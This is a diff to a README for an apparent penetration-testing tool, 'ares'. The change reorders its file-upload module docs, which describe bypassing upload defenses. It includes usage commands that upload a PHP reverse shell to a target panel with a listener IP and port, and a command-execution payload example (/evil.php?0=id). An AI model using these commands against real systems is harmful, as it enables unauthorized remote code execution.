@@ -61,13 +61,12 @@ Bypass common File Upload defenses.
 	-a <EXTENSION>: Allowed extension to use with Null Byte (defaults to jpg). Enter the extension without a period prepended.
 	-b: Basic payload instead of a Reverse Shell. Provide commands as the value of the 0 parameter (e.g. /evil.php?0=id) . Incompatible with -e
 
-[Example Usage]
+[Supported File Types]
+    Uploader only supports PHP files. More file types will be added in subsequent updates.
+
+[Usage]
 	ares -m upload -i 12.345.67.89 -p 1337 -u http://10.10.40.117/panel/ -n fileUpload -e http://10.10.40.117/uploads/ -a png
 	ares -m upload -u http://10.10.40.117/panel/ -n fileUpload -b
-
-[Supported File Types]
-
-Currently, Uploader only supports PHP files. More file types will be added in subsequent updates.
 ```
 
 ### Roasting
